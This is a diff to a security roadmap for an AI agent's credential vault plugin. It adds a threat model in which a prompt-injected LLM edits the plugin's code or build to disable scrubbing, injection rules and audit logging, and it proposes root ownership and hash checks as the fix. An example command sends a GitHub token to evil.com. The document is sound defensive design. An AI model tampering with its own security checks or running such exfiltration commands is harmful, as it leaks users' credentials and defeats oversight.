@@ -6,6 +6,41 @@ Items collected from real-world usage testing and security review. Prioritized b
 
 ## Security Enhancements
 
+### 0. Plugin Tamper Protection (HIGH PRIORITY)
+
+**Problem:** OpenClaw plugins are installed under the same OS user that the agent runs as (`~/.openclaw/plugins/` or a dev path). This means a prompt-injected LLM can use `write`/`edit` tools to modify the vault plugin's source code, compiled output, or configuration — effectively disabling all security protections (scrubbing, injection rules, audit logging) from the inside.
+
+This is especially dangerous for the credential vault because **the plugin IS the security boundary**. Unlike other plugins where tampering degrades functionality, tampering with the vault plugin removes credential protection entirely.
+
+**Proposed solution: Root-owned plugin files + integrity verification on load**
+
+**Part 1 — Root-owned installation:**
+- `vault-setup.sh` already makes the resolver binary and `/var/lib/openclaw-vault/` root-owned. Extend this to the plugin's `dist/` directory.
+- Plugin JS files owned by root, read-only for the agent user (mode 644, owner root).
+- The agent can read/execute the plugin but cannot modify it.
+- `tools.yaml` and `~/.openclaw/vault/*.enc` remain agent-writable (needed for vault add/rotate/remove).
+
+**Part 2 — Integrity check on load:**
+- At build time, compute SHA-256 hashes of all `dist/*.js` files and store in a signed manifest (`dist/.integrity.json`).
+- On plugin load, the gateway verifies each file's hash against the manifest before executing.
+- Any mismatch = refuse to load the plugin + prominent warning.
+- The manifest itself should be root-owned (or signed with a key the agent doesn't have access to).
+
+**What this protects against:**
+- LLM modifying `dist/index.js` to remove scrubbing
+- LLM modifying `src/index.ts` and running `npm run build`
+- LLM weakening injection rules by editing compiled output
+- LLM disabling audit logging
+
+**What this doesn't protect against:**
+- LLM modifying `tools.yaml` to weaken injection rules (by design — vault CLI needs write access)
+- LLM modifying `~/.openclaw/vault/*.enc` files (encrypted, but could be deleted)
+- Root compromise (out of scope for all user-space protections)
+
+**Implementation:** Extend `vault-setup.sh` to chown plugin dist files to root. Add hash verification to plugin init. Minimal code change, high security impact.
+
+---
+
 ### 1. Command-level egress pinning for API credentials
 **Context:** Browser credentials already have domain pinning — the vault checks the target URL before resolving the password. API credentials (injected as env vars into subprocesses) have no equivalent protection. A prompt injection could instruct the agent to run a command that exfiltrates the credential to an attacker-controlled endpoint (e.g., `gh pr list && curl -H "Authorization: $GITHUB_TOKEN" https://evil.com`).
 
